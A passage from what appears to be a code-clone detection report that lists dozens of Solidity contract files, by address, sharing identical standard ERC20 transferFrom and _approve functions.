        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="86" endline="95" pcid="6078">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="88" endline="97" pcid="2020">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="85" endline="94" pcid="8248">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="89" endline="98" pcid="4421">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="86" endline="95" pcid="8263">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="82" endline="91" pcid="979">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="85" endline="94" pcid="9196">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="86" endline="95" pcid="6308">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="85" endline="94" pcid="6268">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="89" endline="98" pcid="683">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="87" endline="96" pcid="7461">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="89" endline="98" pcid="1645">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="86" endline="95" pcid="5437">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="87" endline="96" pcid="1283">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="89" endline="98" pcid="467">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="180" endline="189" pcid="1100">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="86" endline="95" pcid="5081">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="89" endline="98" pcid="4679">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="89" endline="98" pcid="8915">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="85" endline="94" pcid="6752">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="86" endline="95" pcid="1552">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="172" endline="181" pcid="4906">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="90" endline="99" pcid="7238">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="90" endline="99" pcid="1069">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="86" endline="95" pcid="9062">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="89" endline="98" pcid="6844">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="188" endline="197" pcid="4511">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="189" endline="198" pcid="3748">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="89" endline="98" pcid="6674">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="87" endline="96" pcid="251">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="89" endline="98" pcid="2005">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="89" endline="98" pcid="2099">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="92" endline="101" pcid="8741">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="86" endline="95" pcid="3960">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="90" endline="99" pcid="7254">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="86" endline="95" pcid="4321">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
</class>

<class classid="38" nclones="479" nlines="6" similarity="100">
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="102" endline="111" pcid="56">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="190" endline="199" pcid="4176">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="98" endline="107" pcid="5360">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="100" endline="109" pcid="9149">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="99" endline="108" pcid="1010">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="99" endline="108" pcid="8537">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="96" endline="105" pcid="1151">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="102" endline="111" pcid="7346">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="82" endline="91" pcid="6556">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="98" endline="107" pcid="1934">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="98" endline="107" pcid="3976">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="102" endline="111" pcid="4481">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="96" endline="105" pcid="9182">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="98" endline="107" pcid="252">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="97" endline="106" pcid="8589">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="100" endline="109" pcid="3874">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="102" endline="111" pcid="2085">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="96" endline="105" pcid="4847">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="100" endline="109" pcid="8444">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="100" endline="109" pcid="1494">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="99" endline="108" pcid="7477">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="97" endline="106" pcid="5835">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="96" endline="105" pcid="4307">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="98" endline="107" pcid="965">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="100" endline="109" pcid="7447">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="101" endline="110" pcid="5981">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="95" endline="104" pcid="5338">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="98" endline="107" pcid="4496">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="98" endline="107" pcid="5191">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="100" endline="109" pcid="4635">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="96" endline="105" pcid="2115">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="100" endline="109" pcid="7492">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="96" endline="105" pcid="8354">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="99" endline="108" pcid="5649">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="97" endline="106" pcid="7703">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="100" endline="109" pcid="1203">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="96" endline="105" pcid="5739">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="94" endline="103" pcid="1904">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="100" endline="109" pcid="5453">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="96" endline="105" pcid="8996">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="99" endline="108" pcid="7194">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="103" endline="112" pcid="8173">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="97" endline="106" pcid="1616">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="96" endline="105" pcid="5754">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="98" endline="107" pcid="9164">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="100" endline="109" pcid="165">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="100" endline="109" pcid="6234">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="83" endline="92" pcid="8052">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
